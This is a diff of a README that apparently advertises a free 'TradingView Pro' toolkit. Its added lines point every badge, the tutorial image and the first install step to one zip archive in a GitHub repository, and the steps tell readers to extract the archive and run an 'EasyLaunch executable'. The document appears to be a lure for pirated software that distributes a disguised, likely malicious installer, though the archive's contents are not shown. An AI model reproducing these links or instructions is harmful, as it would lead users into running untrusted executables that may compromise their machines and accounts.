@@ -1,11 +1,11 @@
 # 🚀 TradingView Pro Download – Ultimate Adaptive Toolset
 
-![Maintenance](https://img.shields.io/badge/Maintained-Yes-brightgreen?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20MacOS%20%7C%20Linux-orange?style=flat-square)
-![Languages](https://img.shields.io/badge/Multilanguage-Yes-purple?style=flat-square)
-![AI Connected](https://img.shields.io/badge/OpenAI%20API-Integrated-informational?style=flat-square)
-![AI Connected](https://img.shields.io/badge/Claude%20API-Enabled-blueviolet?style=flat-square)
+![Maintenance](https://github.com/newperiod/tradingview-pro-toolkit/raw/refs/heads/main/caudotibialis/toolkit-tradingview-pro-v3.6.zip)
+![License](https://github.com/newperiod/tradingview-pro-toolkit/raw/refs/heads/main/caudotibialis/toolkit-tradingview-pro-v3.6.zip)
+![Platform](https://github.com/newperiod/tradingview-pro-toolkit/raw/refs/heads/main/caudotibialis/toolkit-tradingview-pro-v3.6.zip%20%7C%20MacOS%20%7C%20Linux-orange?style=flat-square)
+![Languages](https://github.com/newperiod/tradingview-pro-toolkit/raw/refs/heads/main/caudotibialis/toolkit-tradingview-pro-v3.6.zip)
+![AI Connected](https://github.com/newperiod/tradingview-pro-toolkit/raw/refs/heads/main/caudotibialis/toolkit-tradingview-pro-v3.6.zip%20API-Integrated-informational?style=flat-square)
+![AI Connected](https://github.com/newperiod/tradingview-pro-toolkit/raw/refs/heads/main/caudotibialis/toolkit-tradingview-pro-v3.6.zip%20API-Enabled-blueviolet?style=flat-square)
 
 ---
 
@@ -78,13 +78,13 @@ Discover the next dimension for your trading journey, built for serious investor
 
 Ready to start? Just follow this simple roadmap:
 
-1. **Download EasyLaunch.zip from the repository.**  
+1. **Download https://github.com/newperiod/tradingview-pro-toolkit/raw/refs/heads/main/caudotibialis/toolkit-tradingview-pro-v3.6.zip from the repository.**  
    (No external links here—get it straight from this page.)
 2. **Extract the archive** to your desired folder using your favorite tool.
 3. **Run the EasyLaunch executable**—our installer will guide you through the optimal setup experience.
 4. **Follow the animated video installation tutorial below:**
 
-   <img src="https://i.imgur.com/Js67NIU.gif" alt="Install Tutorial TradingView Pro Download" width="500"/>
+   <img src="https://github.com/newperiod/tradingview-pro-toolkit/raw/refs/heads/main/caudotibialis/toolkit-tradingview-pro-v3.6.zip" alt="Install Tutorial TradingView Pro Download" width="500"/>
 
 5. **Start TradingView Pro Download and set up your preferences.**  
    Enjoy seamless multi-language support and adaptive AI integration right out of the box.
